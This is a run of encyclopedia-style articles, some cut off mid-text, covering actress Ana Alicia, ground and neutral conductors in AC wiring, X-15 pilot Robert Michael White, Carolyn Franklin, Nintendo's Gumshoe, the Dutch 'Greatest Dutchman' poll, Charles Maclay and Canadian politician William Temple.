Now going by &quot;Ana Alicia&quot; professionally, she landed several guest roles in episodic television, including Starbuck&#x27;s love interest, Aurora, in the 1979 &quot;Battlestar Galactica&quot; episode &quot;Take the Celestra&quot; and Gloria Alonzo in the episode &quot;Space Croppers&quot; of the series sequel &quot;Galactica 1980&quot;. Between these she appeared as Falina Redding in the &quot;Buck Rogers in the 25th Century&quot; episode &quot;Vegas in Space.&quot; In 1979 Ana Alicia appeared in the made-for-TV movie &quot;The Sacketts&quot; as Drusilla, the love of Tyrell Sackett. The movie was based on the Louis L&#x27;Amour books &quot;The Sacketts and The Daybreakers&quot;. She played a major role in the 1981 TV movie &quot;Coward of the County&quot;, which also starred Kenny Rogers, and was based on his hit song of the same name. In 1982, she was cast in the role of spoiled, selfish vineyard heiress Melissa Agretti on &quot;Falcon Crest&quot; as a replacement for actress Delores Cantú who had played Melissa for one episode in early 1982. Ana Alicia appeared in the 1983 TV-movie, &quot;Happy Endings&quot;, opposite John Schneider and her former &quot;Ryan&#x27;s Hope&quot; co-star, Catherine Hicks.

In 1989, Ortiz appeared with Raúl Juliá in the movie &quot;Romero&quot;, her only non-television film role, apart from &quot;Halloween II&quot; in 1981. Then in 1990, Ana Alicia appeared in the 1990 made-for-TV movie &quot;Miracle Landing&quot; as flight attendant Michelle Honda. The film is based on an in-flight accident aboard Aloha Airlines Flight 243 that occurred in April 1988. Ana Alicia continued to play guest roles on episodic television, including two episodes in the action series &quot;Renegade&quot; which reunited her with her former &quot;Falcon Crest&quot; screen husband Lorenzo Lamas.

Alicia sang two songs on the soap, &quot;Falcon Crest&quot;. The first song was &quot;Goody Goody&quot;, a famous 1936 song composed by Matty Malneck with lyrics by Johnny Mercer. The song was first sung by Bing Crosby. The second song was &quot;Body and Soul&quot;. It was written by Edward Heyman, Robert Sour, Frank Eyton and Johnny Green in 1930. The song was presented by Libby Holman in the revue &quot;Three&#x27;s a Crowd&quot; and used as the theme of the 1947 film, &quot;Body and Soul&quot;, becoming a jazz favorite.

In October 2010, Ana Alicia appeared in a promotional video for the Norwegian television show &quot;Gylne Tider&quot;. She and other celebrities filmed a cover of The Beatles song &quot;Let It Be&quot;.

Ana Alicia was the national spokesperson for The Humane Society of the United States. She has given out awards promoting Hispanic accomplishments in the media from the Golden Eagle Awards.

==Family==
Alicia married producer and entrepreneur Gary R. Benz on April 24, 1994; they divorced in 2016.

<text>In electrical engineering, ground and neutral (earth and neutral) are circuit conductors used in alternating current (AC) electrical systems. The neutral conductor receives and returns alternating current to the supply during normal operation of the circuit; to limit the effects of leakage current from higher-voltage systems, the neutral conductor is often connected to earth ground at the point of supply. By contrast, a ground conductor is not intended to carry current for normal operation, but instead connects exposed metallic components (such as equipment enclosures or conduits enclosing wiring) to earth ground. A ground conductor only carries significant current if there is a circuit fault that would otherwise energize exposed conductive parts and present a shock hazard. In that case, circuit protection devices may detect a fault to a grounded metal enclosure and automatically de-energize the circuit, or may provide a warning of a ground fault. 

Under certain conditions, a conductor used to connect to a system neutral is also used for grounding (earthing) of equipment and structures. Current carried on a grounding conductor can result in objectionable or dangerous voltages appearing on equipment enclosures, so the installation of grounding conductors and neutral conductors is carefully defined in electrical regulations. Where a neutral conductor is used also to connect equipment enclosures to earth, care must be taken that the neutral conductor never rises to a high voltage with respect to local ground.

==Definitions==
Ground or earth in a mains (AC power) electrical wiring system is a conductor that provides a low-impedance path to the earth to prevent hazardous voltages from appearing on equipment (high voltage spikes). The terms and are used synonymously in this section; is more common in North American English, and is more common in British English. Under normal conditions, a grounding conductor does not carry current. Grounding is also an integral path for home wiring because it causes circuit breakers to trip more quickly (ie, GFCI), which is safer. Adding new grounds requires a qualified electrician with knowledge particular to a power distribution region.

Neutral is a circuit conductor that normally completes the circuit back to the source. NEC states that the neutral and ground wires should be connected at the neutral point of the transformer or generator, or otherwise some &quot;system neutral point&quot; but not anywhere else. That is for simple single panel installations; for multiple panels the situation is more complex.
In a polyphase (usually three-phase) AC system, the neutral conductor is intended to have similar voltages to each of the other circuit conductors, but may carry very little current if the phases are balanced.

All neutral wires of the same earthed (grounded) electrical system should have the same electrical potential, because they are all connected through the system ground. Neutral conductors are usually insulated for the same voltage as the line conductors, with interesting exceptions.

==Circuitry==
Neutral wires are usually connected at a neutral bus within panelboards or switchboards, and are &quot;bonded&quot; to earth ground at either the electrical service entrance, or at transformers within the system. For electrical installations with split-phase (three-wire single-phase) service, the neutral point of the system is at the center-tap on the secondary side of the service transformer. For larger electrical installations, such as those with polyphase service, the neutral point is usually at the common connection on the secondary side of delta/wye connected transformers. Other arrangements of polyphase transformers may result in no neutral point, and no neutral conductors.

==Grounding systems==
The IEC standard (IEC 60364) codifies methods of installing neutral and ground conductors in a building, where these earthing systems are designated with letter symbols. The letter symbols are common in countries using IEC standards, but North American practices rarely refer to the IEC symbols. The differences are that the conductors may be separate over their entire run from equipment to earth ground, or may be combined all or part of their length. Different systems are used to minimize the voltage difference between neutral and local earth ground. Current flowing in a grounding conductor will produce a voltage drop along the conductor, and grounding systems seek to ensure this voltage does not reach unsafe levels. 

In the TN-S system, separate neutral and protective earth conductors are installed between the equipment and the source of supply (generator or electric utility transformer). Normal circuit currents flow only in the neutral, and the protective earth conductor bonds all equipment cases to earth to intercept any leakage current due to insulation failure. The neutral conductor is connected to earth at the building point of supply, but no common path to ground exists for circuit current and the protective conductor.

In the TN-C system, a common conductor provides both the neutral and protective grounding. The neutral conductor is connected to earth ground at the point of supply, and equipment cases are connected to the neutral. The danger exists that a broken neutral connection will allow all the equipment cases to rise to a dangerous voltage if any leakage or insulation fault exists in any equipment. This can be mitigated with special cables but the cost is then higher. 

In the TN-C-S system, each piece of electrical equipment has both a protective ground connection to its case, and a neutral connection. These are all brought back to some common point in the building system, and a common connection is then made from that point back to the source of supply and to the earth. 

In a TT system, no lengthy common protective ground conductor is used, instead each article of electrical equipment (or building distribution system) has its own connection to earth ground.

Indian CEAR, Rule 41, makes the following provisions:

* The neutral conductor of a 3-phase, 4-wire system and the middle conductor of a 2- phase, 3-wire system must have at least 2 separate and distinct earth connections with a minimum of 2 different earth electrodes to have a satisfactory earth resistance
* The earth electrodes must be interconnected to reduce earth resistance
* The neutral conductor shall also be earthed at one or more points along the distribution system or service line in addition to any connection at the user end

==Combining neutral with ground==

Stray voltages created in grounding (earthing) conductors by currents flowing in the supply utility neutral conductors can be troublesome. For example, special measures may be required in barns used for milking dairy cattle. Very small voltages, not usually perceptible to humans, may cause low milk yield, or even mastitis (inflammation of the udder).
So-called &quot;tingle voltage filters&quot; may be required in the electrical distribution system for a milking parlour.

Connecting the neutral to the equipment case provides some protection against faults, but may produce a dangerous voltage on the case if the neutral connection is broken.

Combined neutral and ground conductors are commonly used in electricity supply companies&#x27; wiring and occasionally for fixed wiring in buildings and for some specialist applications where there is little alternative, such as railways and trams. Since normal circuit currents in the neutral conductor can lead to objectionable or dangerous differences between local earth potential and the neutral, and to protect against neutral breakages, special precautions such as frequent rodding down to earth (multiple ground rod connections), use of cables where the combined neutral and earth completely surrounds the phase conductor(s), and thicker than normal equipotential bonding must be considered to ensure the system is safe.

===Fixed appliances on three-wire circuits===
In the United States, the cases of some kitchen stoves (ranges, ovens), cook tops, clothes dryers and other specifically &quot;listed&quot; appliances were grounded through their neutral wires as a measure to conserve copper from copper cables during World War II. This practice was removed from the NEC in the 1996 edition, but existing installations (called &quot;old work&quot;) may still allow the cases of such &quot;listed&quot; appliances to be connected to the neutral conductor for grounding. (Canada did not adopt this system and instead during this time and into the present uses separate neutral and ground wires.)

This practice arose from the three-wire system used to supply both 120 volt and 240 volt loads. Because these &quot;listed&quot; appliances often have components that use either 120, or both 120 and 240 volts, there is often some current on the neutral wire. This differs from the protective grounding wire, which only carries current under fault conditions. Using the neutral conductor for grounding the equipment enclosure was considered safe since the devices were permanently wired to the supply and so the neutral was unlikely to be broken without also breaking both supply conductors. Also, the unbalanced current due to lamps and small motors in the appliances was small compared to the rating of the conductors and therefore unlikely to cause a large voltage drop in the neutral conductor.

===Portable appliances===
In North American and European practice, small portable equipment connected by a cord set is permitted under certain conditions to have merely two conductors in the attachment plug. A polarized plug can be used to maintain the identity of the neutral conductor into the appliance but neutral is never used as a chassis/case ground. The small cords to lamps, etc., often have one or more molded ridges or embedded strings to identify the neutral conductor, or may be identified by colour. Portable appliances never use the neutral conductor for case grounding, and often feature &quot;double-insulated&quot; construction.

In places where the design of the plug and socket cannot ensure that a system neutral conductor is connected to particular terminals of the device (&quot;unpolarized&quot; plugs), portable appliances must be designed on the assumption that either pole of each circuit may reach full main voltage with respect to the ground.

===Technical equipment===
In North American practice, equipment connected by a cord set must have three wires if supplied exclusively by 240 volts, or must have four wires (including neutral and ground), if supplied by 120/240 volts.

There are special provisions in the NEC for so-called technical equipment, mainly professional grade audio and video equipment supplied by so-called &quot;balanced&quot; 120 volt circuits. The center tap of a transformer is connected to ground, and the equipment is supplied by two line wires each 60 volts to ground (and 120 volts between line conductors). The center tap is not distributed to the equipment and no neutral conductor is used. These cases generally use a grounding conductor which is separated from the safety grounding conductor specifically for the purposes of noise and &quot;hum&quot; reduction.

Another specialized distribution system was formerly specified in patient care areas of hospitals. An isolated power system was furnished, from a special isolation transformer, with the intention of minimizing any leakage current that could pass through equipment directly connected to a patient (for example, an electrocardiograph for monitoring the heart). The neutral of the circuit was not connected to ground. The leakage current was due to the distributed capacitance of the wiring and capacitance of the supply transformer. Such distribution systems were monitored by permanently installed instruments to give an alarm when high leakage current was detected.

==Shared neutral==
A shared neutral is a connection in which a plurality of circuits use the same neutral connection. This is also known as a common neutral, and the circuits and neutral together are sometimes referred to as an Edison circuit.

===Three-phase circuits===
In a three-phase circuit, a neutral is shared between all three phases. Commonly the system neutral is connected to the star point on the feeding transformer. This is the reason that the secondary side of most three-phase distribution transformers is wye- or star-wound. Three-phase transformers and their associated neutrals are usually found in industrial distribution environments.

A system could be made entirely ungrounded. In this case a fault between one phase and ground would not cause any significant current. Commonly the neutral is grounded (earthed) through a bond between the neutral bar and the earth bar. It is common on larger systems to monitor any current flowing through the neutral-to-earth link and use this as the basis for neutral fault protection.
The connection between neutral and earth allows any phase-to-earth fault to develop enough current flow to &quot;trip&quot; the circuit overcurrent protection device. In some jurisdictions, calculations are required to ensure the fault loop impedance is low enough so that fault current will trip the protection (In Australia, this is referred to in AS3000:2007 Fault loop impedance calculation). This may limit the length of a branch circuit.
In the case of two phases sharing one neutral and the third phase is disconnected, the worst-case current draw is one side has zero load and the other has full load, or when both sides have full load. The latter case results in formula_1 , formula_2 or formula_3 where formula_4 is the magnitude of the current. In other words the magnitude of the current in the neutral equals that of the other two wires.

In a three-phase linear circuit with three identical resistive or reactive loads, the neutral carries no current. The neutral carries current if the loads on each phase are not identical. In some jurisdictions, the neutral is allowed to be reduced in size if no unbalanced current flow is expected. If the neutral is smaller than the phase conductors, it can be overloaded if a large unbalanced load occurs.

The current drawn by non-linear loads, such as fluorescent &amp; HID lighting and electronic equipment containing switching power supplies, often contains harmonics. Triplen harmonic currents (odd multiples of the third harmonic) are additive, resulting in more current in the shared neutral conductor than in any of the phase conductors. In the absolute worst case, the current in the shared neutral conductor can be triple that in each phase conductor. Some jurisdictions prohibit the use of shared neutral conductors when feeding single-phase loads from a three-phase source; others require that the neutral conductor be substantially larger than the phase conductors. It is good practice to use four-pole circuit breakers (as opposed to the standard three-pole) where the fourth pole is the neutral phase, and is hence protected against overcurrent on the neutral conductor.

===Split phase===

In split-phase wiring, for example a duplex receptacle in a North American kitchen, devices may be connected with a cable that has three conductors, in addition to ground. The three conductors are usually coloured red, black, and white. The white serves as a common neutral, while the red and black each feed, separately, the top and bottom hot sides of the receptacle. Typically such receptacles are supplied from two circuit breakers in which the handles of two poles are tied together for a common trip. If two large appliances are used at once, current passes through both and the neutral only carries the difference in current. The advantage is that only three wires are required to serve these loads, instead of four. If one kitchen appliance overloads the circuit, the other side of the duplex receptacle will be shut off as well. This is called a multiwire branch circuit. Common trip is required when the connected load uses more than one phase simultaneously. The common trip prevents overloading of the shared neutral if one device draws more than rated current.

==Grounding problems==
A ground connection that is missing or of inadequate capacity may not provide the protective functions as intended during a fault in the connected equipment. Extra connections between ground and circuit neutral may result in circulating current in the ground path, stray current introduced in the earth or in a structure, and stray voltage. Extra ground connections on a neutral conductor may bypass the protection provided by a ground-fault circuit interrupter. Signal circuits that rely on a ground connection will not function or will have erratic function if the ground connection is missing.

<doc id="1065634" wikidata="Q2620784" url="?curid=1065634" title="Robert Michael White">
<text>Robert Michael White (July 6, 1924 – March 17, 2010) (Maj Gen, USAF) was an American electrical engineer, test pilot, fighter pilot, and astronaut. He was one of twelve pilots who flew the North American X-15, an experimental spaceplane jointly operated by the Air Force and NASA. As an engineer, he supervised the design and development of several modern military aircraft.

On July 17, 1962, he flew the X-15 to an altitude above 50 miles, thereby qualifying as an astronaut according to the United States definition of the boundary of space.

==Background and career==
White was born in New York City on July 6, 1924. After graduating from high school, he entered active military service in November 1942 as an aviation cadet in the United States Army Air Forces, and received his pilot wings and commission as a second lieutenant in February 1944.

During World War II, he served with the 355th Fighter Group in the European Theater of Operations. He flew P-51 Mustangs from July 1944 until February 1945, when he was shot down over Germany on his 52nd combat mission. He was captured and remained a prisoner of war until his release in April 1945.

He then returned to the United States, left active duty in December 1945, and became a member of the Air Force Reserve at Mitchel Air Force Base, New York, while studying Electrical Engineering at New York University. He earned his Bachelor of Science degree from there in 1951, and a Master of Business Administration degree from the George Washington University in 1966.

White was recalled to active duty in May 1951 for the Korean War, where he served as a pilot and engineering officer with the 514th Troop Carrier Wing at Mitchel Air Force Base. In February 1952, he was assigned as a fighter pilot and flight commander with the 40th Fighter-Interceptor Squadron, based at Johnson Air Base, Japan. In August 1953, he returned from overseas to serve as a systems engineer at Rome Air Development Center, Griffiss Air Force Base, New York.

==Test pilot==

White attended the United States Air Force&#x27;s Experimental Flight Test Pilot School at Edwards Air Force Base, California, and became a test pilot, flying advanced models such as the F-86 Sabre, F-89 Scorpion, the new F-102 Delta Dagger, the F-104 Starfighter and the F-105 Thunderchief. He was promoted to Deputy Chief of the Flight Test Operations Division, later becoming Assistant Chief of the Manned Spacecraft Operations Branch.
White was designated the Air Force&#x27;s primary pilot for the North American X-15 program in 1958. While the new plane was undergoing its initial tests, he attended the Air Command and Staff College at Maxwell Air Force Base, Alabama, graduating in 1959. He made his first test flight of the X-15 on April 15, 1960, when the aircraft was fitted with two interim, XLR-11 thrust rocket engines. Four months later, he flew to an altitude of 136,000 feet (41.5 km) above Rogers Dry Lake. White would have participated in the Air Force&#x27;s Man In Space Soonest program, had it come to fruition.

In February 1961, White unofficially set a new air speed record when he flew the X-15 at a speed of , following the installation of a thrust XLR-99 engine. White was the first human to fly an aircraft at Mach 4 and later Mach 5 over the next eight months. On November 9, 1961, White flew the X-15 at , making him the first pilot to fly a winged craft at six times the speed of sound (Mach 6). President John F. Kennedy used the occasion to confer the most prestigious award in American aviation, the Robert J. Collier Trophy, jointly to White and three of his fellow X-15 pilots: NASA&#x27;s Joseph A. Walker, Commander Forrest S. Petersen of the U.S. Navy, and North American Aviation test pilot Scott Crossfield. A day later, Air Force Chief of Staff General Curtis E. LeMay awarded White his new rating as a Command Pilot Astronaut.

On July 17, 1962, Major White flew the X-15 to an altitude of 314,750 feet (59 miles, 96 km). This qualified him for USAF astronaut wings, becoming the first &quot;winged&quot; astronaut, and one of a few who have flown into space without a conventional spacecraft. Major Bob White was featured with a cover story in the August 3, 1962, issue of &quot;Life&quot; magazine, detailing his July 17 flight.

Pilot Robert White commented on his high altitude X-15 flights:

My flights to 217,000 feet [66 km] and 314,750 feet [96 km] were very dramatic in revealing the Earth&#x27;s curvature ... at my highest altitude I could turn my head through a 180-degree arc and wow!—the Earth is really round. At my peak altitude I was roughly over the Arizona/California border in the area of Las Vegas, and this was how I described it: Looking to my left I felt I could spit into the Gulf of California; looking to my right I felt I could toss a dime into San Francisco Bay.
==Post-test pilot career==
In October 1963, he returned to Germany, where he served as operations officer for the 22d Tactical Fighter Squadron, 36th Tactical Fighter Wing, flying F-105 Thunderchiefs at Bitburg Air Base, and from July 1964 to August 1965 as commander of the wing&#x27;s 53d Tactical Fighter Squadron. He returned to the United States in August 1965 to attend the Industrial College of the Armed Forces, Washington, D.C., and graduated a year later. During the same period, he attended George Washington University, receiving his Master of Business Administration degree in 1966. Lieutenant Colonel White then was transferred to Air Force Systems Command at Wright-Patterson Air Force Base, Ohio, as chief of the Tactical Systems Office, F-111 Systems Program Office, where he served from September 1966 to May 1967.
In May 1967, during the Vietnam War, Colonel White was assigned as Deputy Commander for Operations of the 355th Tactical Fighter Wing, an F-105 unit based at Takhli Royal Thai Air Force Base, Thailand. He flew 70 combat missions over North Vietnam, including leading an attack against the Paul Doumer Bridge in Hanoi on August 11, 1967, for which he was awarded the Air Force Cross. He was transferred in October to the Seventh Air Force Headquarters at Tan Son Nhut Air Base, South Vietnam, serving as chief of the Attack Division in the Directorate of Combat Operations.

White returned to the United States and Wright-Patterson Air Force Base in June 1968, where he served as director of the F-15 Eagle Systems Program, responsible for managing development and production planning, in the Aeronautical Systems Division, Air Force Systems Command.

On July 31, 1970, White assumed duties as commander of the Air Force Flight Test Center, Edwards Air Force Base, where he was responsible for research and developmental flight testing of manned and unmanned aerospace vehicles, aircraft systems, deceleration devices and for the Air Force Test Pilot School. During his tenure, testing was begun on such important programs as the F-15 Air Superiority Fighter, the A-X ground attack aircraft, and the Airborne Warning and Control System. In October 1971, he completed the Naval Test Parachutist course and was awarded parachutist&#x27;s wings.

He served at the Flight Test Center until October 17, 1972. The following month, he assumed the duties of Commandant, Air Force Reserve Officer Training Corps (AFROTC), responsible for the entire AFROTC officer accession program at all colleges and universities across the United States.

White was promoted to the grade of major general effective February 12, 1975, with date of rank July 1, 1972. In March became Chief of Staff of the Fourth Allied Tactical Air Force. He retired from active duty on February 1, 1981.

In 1992, White was inducted into the Aerospace Walk of Honor. General White was inducted into the National Aviation Hall of Fame in Dayton, Ohio, on 15 July 2006. A rumor abounds that in honor of his achievements, the Scaled Composites White Knight spacecraft launch plane was named after White and fellow X-15 pilot Pete Knight. Space Ship One and White Knight pilot/astronaut Brian Binnie reports this is not true.

He died on March 17, 2010, at the age of 85.

===Air Force Cross citation===
:Colonel Robert M. White
:U.S. Air Force
: Date Of Action: August 11, 1967

The President of the United States of America, authorized by Title 10, Section 8742, United States Code, awards the Air Force Cross to Colonel Robert M. White, for extraordinary heroism in military operations against an opposing armed force as an F-105 Mission Commander near Hanoi, North Vietnam, on 11 August 1967. On that date, Colonel White led the entire combat force against a key railroad and highway bridge in the vicinity of Hanoi. In spite of 14 surface-to-air missile launches, MIG interceptor attacks, and intense antiaircraft artillery fire, he gallantly led the attack. By being the first aircraft to dive through the dark clouds of bursting flak, Colonel White set an example that inspired the remaining attacking force to destroy the bridge without a single aircraft being lost to the hostile gunners. Through his extraordinary heroism, superb airmanship, and aggressiveness in the face of hostile forces, Colonel White reflected the highest credit upon himself and the United States Air Force.

<text>Carolyn Ann Franklin (May 13, 1944 – April 25, 1988) was an American singer-songwriter. Besides her own musical success, Franklin was best known as the daughter of prominent Detroit preacher and civil rights activist C. L. Franklin and the younger sister of singer/musician Aretha Franklin.

==Biography==
Franklin was born in Memphis, to Barbara (née Siggers) and Reverend C. L. Franklin. The youngest of the minister&#x27;s six children, she moved to Buffalo, New York, shortly after her birth. Around 1946, the Franklin family settled in Detroit, where Carolyn would begin singing at her father&#x27;s New Bethel Baptist Church.

Inspired by her sisters&#x27; successes in the secular music field in the early 1960s, Carolyn followed Erma and Aretha into a secular music career, first recording in 1963. Carolyn began recording for RCA Records in 1969 and remained with the label until retiring from the music industry in 1976. Like Erma&#x27;s, Carolyn&#x27;s modest success in the industry did not match Aretha&#x27;s blockbuster breakthrough in the late 1960s. While struggling to release a hit, she began to work behind the scenes as a songwriter, mainly for sister Aretha&#x27;s work. Aretha and Carolyn&#x27;s bond led to several collaborations between the two, and Carolyn came up with several compositions that became classic hits, including &quot;Ain&#x27;t No Way&quot;, recorded in 1968. The ballad single was the B-side to Aretha&#x27;s #1 R&amp;B/Top Five Pop triumph, &quot;(Sweet Sweet Baby) Since You&#x27;ve Been Gone&quot;. The song was strong enough to hit the R&amp;B Top 10 and also went Top 20 on the &quot;Billboard&quot; Hot 100.
Carolyn&#x27;s next hit for her sister was the 1973 ballad &quot;Angel&quot;, which also featured Carolyn and eldest sister Erma Franklin in background voices advising Aretha. Aretha mentioned her sister&#x27;s name in the beginning of the song in a monologue, describing how Carolyn came up with the song. Another track Carolyn contributed was 1970&#x27;s &quot;Pullin&#x27;&quot; with Jimmy Radcliffe. Carolyn also wrote songs for Franklin&#x27;s 1970 album &quot;Spirit in the Dark&quot; and her failed 1975 platter, &quot;You&quot;.

Franklin retired from the music industry in 1976, though she occasionally continued to sing with Aretha. Franklin appeared as one of Aretha&#x27;s background singers in the 1980 movie &quot;The Blues Brothers&quot;, and was a backing vocalist on Paul King&#x27;s 1987 album &quot;Joy&quot;.

Franklin died of metastatic breast cancer at Aretha&#x27;s Scenic Court home in Bloomfield Hills, Michigan, on April 25, 1988, and – like other deceased family members – is interred at Detroit&#x27;s historic Woodlawn Cemetery on North Woodward Avenue.

During World War II, he served in the United States Army from 1942 to 1945. After the war he was an administrative assistant to Senator Tom Stewart from 1945 to 1949, and to Governor Gordon Browning from 1950 to 1952. Afterwards, he became executive secretary of the Tennessee County Services Association.

In 1958, Everett entered the contest for the Eighth Congressional District seat of Jere Cooper, who had died in office. He won the special election and served the balance of Cooper&#x27;s term and five subsequent terms, serving from February 1, 1958, until his death in the first month of his seventh term. Like the voters of his district, he was predominantly a conservative, largely reflecting the views of his party&#x27;s Southern wing.

==Death==
Everett died of pneumonia and flu complications at Veterans Hospital in Nashville, Tennessee on January 26, 1969. He is interred at East View Cemetery in Union City. There is a statue of him at the Obion County Courthouse in Union City, Tennessee.

<text>Gumshoe is a light gun shooter video game developed and published by Nintendo for the VS. System arcade hardware and the Nintendo Entertainment System console. It was released in 1986 in North America and in 1988 in Europe. Unusual for a Nintendo game, it was not released in Japan. It was designed by Yoshio Sakamoto.

== Plot ==
Mr. Stevenson is an ex-FBI agent turned detective. He receives a ransom note from a mafia boss, King Dom, who has kidnapped Stevenson&#x27;s daughter, Jennifer. Stevenson must collect five &quot;Black Panther diamonds&quot; within 24 hours in order to see his daughter again.

== Gameplay==
Mr. Stevenson walks continuously to the right and will jump if shot with the NES Zapper. The player must also shoot enemies as they appear on screen. Shooting Mr. Stevenson to make him jump will not subtract from the player&#x27;s ammunition. Shooting obstacles, or an empty area, however, will subtract one bullet from the total. Grabbing red balloons will add bullets to Mr. Stevenson&#x27;s arsenal.

&quot;Gumshoe&quot; contains four levels, and each level includes a secret bonus area that can be accessed by attaining at least twenty balloons before passing the section of the level that transitions into the bonus area.

== Release ==
The release date changed several times. It was first scheduled for June 1986, and was later changed to August 1986.

== Reception ==
In a 2015 article for &quot;Uproxx&quot;, Nathan Birch ranked &quot;Gumshoe&quot; as the worst of the NES black box releases, criticizing its game mechanics and its &quot;instant-kill pits&quot;, while calling it &quot;one of those lousy Zapper games where you have to protect a dumbass character who trudges forward constantly, oblivious to the dangers around them.&quot; In 2023, Garrett Martin of &quot;Paste&quot; ranked &quot;Gumshoe&quot; fourth on a list of the NES&#x27;s eighteen Zapper games. Martin called &quot;Gumshoe&quot; the &quot;weirdest&quot; and &quot;most fascinating&quot; game on the list but also the most difficult, writing, &quot;it&#x27;s so hard that most will probably lose interest before finishing the first stage.&quot;

In 2013, Simon Parkin of IGN included &quot;Gumshoe&quot; on a list of the ten &quot;best, most important, most interesting or most unusual lesser-known titles&quot; by famous video game developers. Parkin noted that &quot;Gumshoe&quot; represented Yoshio Sakamoto&#x27;s interest in exploring &quot;murky, foreboding scenarios&quot; that contrasted with other Nintendo games. Calling it &quot;one of the most curious genre mash-ups of the era&quot;, he wrote that the game&#x27;s combination of the Zapper with platforming gameplay &quot;demonstrates Sakamoto’s restless creativity&quot; and considered the game notable as &quot;an early precursor to the so-called Endless Runner that has found huge popularity on iOS in recent years.&quot;

<text>De Grootste Nederlander (&#x27;The Greatest Dutchman&#x27;) was a public poll held in 2004 by the broadcasting company KRO of the &quot;Publieke Omroep&quot;. The series has the BBC&#x27;s &quot;100 Greatest Britons&quot; TV format. During the series, it included individual programmes on the top ten, with viewers having further opportunities to vote after each programme.

The recently assassinated politician Pim Fortuyn was announced as the winner in a live television broadcast on 15 November 2004, two weeks after Theo van Gogh was murdered. This was controversial, and was said to be an &quot;embarrassing&quot; choice by several journalists and historians. Later it became revealed that William of Orange had received the most votes in total, but only the votes that were tallied before the end of the live programme counted (the number of calls was so large that not all could be counted before the end of the show). And thus Fortuyn remained the official number one according to the rules, as announced originally.

<text>Charles Maclay (November 9, 1822 – July 19, 1890) was a California state senator and is known for his act of purchasing a 56,000 acre land grant in 1874, what was known as San Fernando Rancho, and using the land to found the city of San Fernando, California in the San Fernando Valley.

==History==
Charles Maclay&#x27;s heritage was Scots-Irish. He was the brother of Robert Samuel Maclay, a pioneer missionary to China; and the uncle of Robert Maclay Widney, a founder of the University of Southern California, and of Joseph Widney, the second president of the University of Southern California. Maclay was a Methodist minister.

Charles Maclay, an abolitionist, became a California State Assemblyman in the 7th District from Santa Clara County (1861-1863) and later a California State Senator (1867-1872).

In 1867, when the seat held by State Senator William J. Knox came open after Knox&#x27;s unexpected death, &quot;The San Jose Mercury&quot;, campaigned for Maclay with the popular song &quot;Wha&#x27;ll be King but Charlie?&quot; (Scots for &quot;Who&#x27;ll be king but Charlie.&quot;)

===San Fernando Valley, California===
In 1874, Maclay purchased a 56,000 acre land grant in 1874, what was known as San Fernando Rancho.

In 1882, cousins George K. Porter and Benjamin F. Porter, owner of future Porter Ranch, each received one-third of the total land.
In 1885, Maclay founded the Maclay School of Theology, a Methodist seminary in his newly founded town of San Fernando, California. After his death it became an affiliate and moved to the campus of the University of Southern California before becoming the Claremont School of Theology in 1957.

==Legacy==
*City of San Fernando
*Claremont School of Theology
*Charles Maclay Junior High School, Pacoima, California: in 1960, the High School opened in his honor. In the late 1990s the school was renamed the Charles Maclay Middle School. Their slogan is &quot;Home of the Scotsman&quot; and uniforms sport their school colors green, white, and grey.
*Maclay Street is a central thoroughfare through the City of San Fernando, crossing from Laurel Canyon Boulevard to Pacoima Canyon Road.

<doc id="1065721" wikidata="Q8012507" url="?curid=1065721" title="William Horace Temple">
<text>William Horace (Bill) Temple (28 November 1898 – 9 April 1988), nicknamed &quot;Temperance Bill&quot; or &quot;Temperance Willie&quot;, was a Canadian socialist politician, trade union activist, businessman and temperance crusader. As a youth he worked for the railway. During World War I, and World War II he served in the Royal Naval Air Service and later on the Royal Canadian Air Force. Between the wars, he was a salesman, and then he started a clothing import business. He became a socialist during that period and joined the Co-operative Commonwealth Federation (CCF) when it was formed. He ran for political office many times for the CCF, both federally and provincially. The highlight of his political career was in 1948, when he defeated the incumbent Ontario Premier George Drew in his own legislative seat, in the electoral district of High Park, even though Drew&#x27;s party won the general election with a majority government. His tenure was relatively short, serving only one term, and was defeated in the 1951 provincial election, and went back into the clothing import business. In his later years, he successfully led the political fight to maintain the prohibition on selling alcohol in a section of Toronto&#x27;s west end and won three referendums in the 1960s, 1970s, and 1980s. He died in the spring of 1988, a few months before another referendum on lifting the restrictions on alcohol in the area was again defeated, his &quot;last&quot; victory.

==Early life==
Temple was born in Montreal on 28 November 1898, and was one of five children. His father was a railway conductor, and the family moved with him to Toronto in 1909. After completing grade 8, due in part to his father&#x27;s alcoholism, he took a job as an office boy with the Grand Trunk Railway for $5 a week.

==Military career==
At the age of 17 Temple went to fight in World War I, joining the Royal Navy Air Service as a fighter pilot before transferring to the Royal Air Force, where he destroyed three Royal Air Force planes and no enemy ones. In 1942, during World War II, he was a flying officer on intelligence operations for the Royal Canadian Air Force stationed in Sydney, Nova Scotia and Gander, Newfoundland.

==Young adulthood==
After World War I, Temple was treated as a war hero by his employer. The Arrow Shirt Company president met Temple&#x27;s train in Montreal, where he promoted him to travelling salesman for the company&#x27;s Winnipeg office.

It was in Winnipeg where Temple – who had been a staunch Conservative, supporting Prime Ministers Sir Robert Borden and Arthur Meighen – was captivated by the speeches of local socialist clergyman and politician J. S. Woodsworth, and became a socialist in 1921. Temple would regularly encounter Woodsworth, then a member of parliament in Ottawa, on train trips for his sales job. Arrow moved him and his wife Mary Temple to Regina, Saskatchewan where he met Major James Coldwell, who at the time, was the principal at the school that she taught at. Coldwell was the leader of the Independent Labour party (ILP), and Temple would drive him to political rallies and events during this period. Another important socialist figure that he met at this time, was Clarence Fines, an assistant principal at Coldwell&#x27;s school. They would go door-to-door to raise money for the ILP. Fines would later become the finance minister in Tommy Douglas&#x27;s Saskatchewan government during the 1940s and 1950s. Temple joined the Co-operative Commonwealth Federation (CCF) when it was formed by Woodsworth and his followers in 1932.

==Great Depression==
When Temple was transferred by Arrow to Kitchener, Ontario in 1933, he became president of the local CCF organization. His employer disapproved of Temple&#x27;s socialist activism and told him to choose between politics and his job. Temple chose politics, putting himself out of work when the Depression was at its worst. Temple borrowed $5,000 from his sister and went to England, where he obtained samples of cashmere sweaters, Dack slacks and Burberry coats, and returned to Canada to find retail outlets. His import business continued until the war, when he enlisted in the RCAF.

==Political career==
In 1943, Flying Officer Temple, took leave, to become the Ontario CCF&#x27;s candidate in the west-end Toronto constituency of High Park in the provincial election. He was narrowly defeated by George Drew, the leader of the Ontario Progressive Conservative Party, by a mere 400 votes. Drew became Premier of Ontario as a result of the election.

